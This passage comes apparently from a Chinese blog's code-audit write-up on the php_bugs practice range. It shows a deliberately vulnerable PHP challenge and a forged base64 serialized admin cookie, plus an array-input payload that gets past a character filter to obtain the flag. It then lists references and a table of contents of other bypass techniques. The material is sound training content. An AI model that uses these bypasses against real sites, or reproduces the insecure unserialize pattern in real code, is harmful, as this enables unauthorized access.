punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$role</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$auth</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$auth</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$role</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$role</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'role'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$role</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$auth</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'[&lt;>?]'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'No No No!'</span><span class=\"token operator\">.</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'[&lt;>?]'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'None.'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token variable\">$rand</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$tmp</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"./uploads/\"</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$rand</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your file is in \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$tmp</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello admin, now you can upload something you are easy to forget.\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br />there are the source.&lt;br />\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;textarea rows=\"10\" cols=\"100\">'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'flag&#123;???&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/textarea>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Sorry. You have no permissions.\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>两个点，第一个的话是让auth为真，这个的话需要满足条件<code>$role === &quot;admin&quot;</code>，这个的话我们可以看role的传值方式是<code>unserialize(base64_decode($_COOKIE[&quot;role&quot;]));</code>，反着操作一下就好了，构造脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到<code>czo1OiJhZG1pbiI7</code>，此时我们赋值给role就可以实现auth为true，此时再来看第二个点<br>上传文件名和文件内容，但data不能含有<code>&lt;&gt;?</code>，而<code> implode</code>函数包裹后的data却又需要有<code>&lt;&gt;?</code>，此时才能够得到flag,对这个函数的简单介绍如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数返回由数组元素组合成的字符串<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里同之前相似，它处理的是字符串，当换成数组时就会输出Null，此时就绕过了<br>此时就可以构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">filename<span class=\"token operator\">=</span>quan9i<span class=\"token operator\">&amp;</span>data<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><span class=\"token operator\">?</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528901.png\" alt=\"在这里插入图片描述\"><br>查看即可获取flag</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://www.cnblogs.com/Cl0ud/p/13380114.html\">https://www.cnblogs.com/Cl0ud/p/13380114.html</a><br><a href=\"https://www.cnblogs.com/pcat/p/5478509.html\">https://www.cnblogs.com/pcat/p/5478509.html</a><br><a href=\"https://saucer-man.com/information_security/101.html\">https://saucer-man.com/information_security/101.html</a><br><a href=\"https://www.cnblogs.com/Cl0ud/p/13393754.html\">https://www.cnblogs.com/Cl0ud/p/13393754.html</a><br><a href=\"https://github.com/bowu678/php_bugs\">https://github.com/bowu678/php_bugs</a></p>\n","feature":true,"text":"前言代码审计不会，学习知识需要积累一下基础，因此来搭建php_bugs进行相关学习，题解如下，希望能对在学习代码审计的师傅们有所帮助 靶场github链接如下https://github.com/bowu678/php_bugs extract变量覆盖&lt;?php $flag...","link":"","photos":[],"count_time":{"symbolsCount":"42k","symbolsTime":"38 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA\"><span class=\"toc-text\">靶场</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96\"><span class=\"toc-text\">extract变量覆盖</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6\"><span class=\"toc-text\">绕过过滤的空白字符</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%9A%E9%87%8D%E5%8A%A0%E5%AF%86\"><span class=\"toc-text\">多重加密</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5-with-rollup%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">SQL注入_with rollup绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ereg%E6%AD%A3%E5%88%99-00%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">ereg正则%00截断</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#strcmp%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A6%E4%B8%B2\"><span class=\"toc-text\">strcmp比较字符串</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sha-%E5%87%BD%E6%95%B0%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">sha()函数比较绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SESSION%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">SESSION验证绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#union-select%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87md5%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">union select注入绕过md5密码</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">urldecode二次编码绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sql%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">sql闭合绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#X-Forwarded-For%E7%BB%95%E8%BF%87%E6%8C%87%E5%AE%9AIP%E5%9C%B0%E5%9D%80\"><span class=\"toc-text\">X-Forwarded-For绕过指定IP地址</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#md5%E5%8A%A0%E5%AF%86%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">md5加密相等绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#intval%E5%87%BD%E6%95%B0%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5\"><span class=\"toc-text\">intval函数四舍五入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#strpos%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87NULL%E4%B8%8Eereg%E6%AD%A3%E5%88%99-00%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">strpos数组绕过NULL与ereg正则%00截断</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#00%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">%00截断</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">数组绕过</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5or%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">SQL注入or绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AF%86%E7%A0%81md5%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">密码md5比较绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#md5-%E5%87%BD%E6%95%B0-%E4%BD%BF%E7%94%A8%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">md5()函数&#x3D;&#x3D;&#x3D;使用数组绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ereg-%E5%87%BD%E6%95%B0strpos-%E5%87%BD%E6%95%B0%E7%94%A8%E6%95%B0%E7%BB%84%E8%BF%94%E5%9B%9ENULL%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">ereg()函数strpos() 函数用数组返回NULL绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#00%E6%88%AA%E6%96%AD-1\"><span class=\"toc-text\">%00截断</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87-1\"><span class=\"toc-text\">数组绕过</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">十六进制与数字比较</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">数字验证正则绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%95%B4%E6%95%B0%E5%A4%A7%E5%B0%8F%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">弱类型整数大小比较绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#md5%E5%87%BD%E6%95%B0%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">md5函数验证绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#md5%E5%87%BD%E6%95%B0true%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">md5函数true绕过注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#switch%E6%B2%A1%E6%9C%89break-%E5%AD%97%E7%AC%A6%E4%B8%8E0%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">switch没有break 字符与0比较绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#unserialize-%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">unserialize()序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#eregi%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">eregi函数漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">哈希长度扩展攻击</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#desc%E4%B8%8E%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%BC%95%E5%8F%91%E7%9A%84SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">desc与反引号引发的SQL注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%8F%90%E4%BA%A4%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E9%80%BB%E8%BE%91\"><span class=\"toc-text\">利用提交数组绕过逻辑</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析XML外部实体注入","uid":"ba5cd70ce8afc153bbd78450a1b070ab","slug":"浅析XML实体注入","date":"2022-09-02T02:11:20.000Z","updated":"2023-03-14T07:25:50.000Z","comments":true,"path":"api/articles/浅析XML实体注入.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141525658.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1716/ 前言在进行系统学习过后，对XXE进行简单总结，希望能对正在学习XXE的师傅有所帮助 前置知识XML什么是XMLXML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"XML","slug":"XML","count":1,"path":"api/tags/XML.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"从零到入门水CVE","uid":"c41197658be58622f172adba6499db6f","slug":"从零到入门水CVE","date":"2022-08-09T11:28:30.000Z","updated":"2023-03-14T07:10:48.000Z","comments":true,"path":"api/articles/从零到入门水CVE.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141510107.jpeg","text":"前言认识的师傅说有的CMS是相对较简单的，拿到源码后就可以简单的进行一下代码审计，审出漏洞的话就可以尝试提交。本次审计过程记录如下 审计过程找到简单的CMS后，进行本地环境搭建，然后用Seay审计系统进行扫描发现漏洞分为三种，SQL注入，文件上传，XSS，接下来进行 /dashb...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"CVE","slug":"CVE","count":1,"path":"api/tags/CVE.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}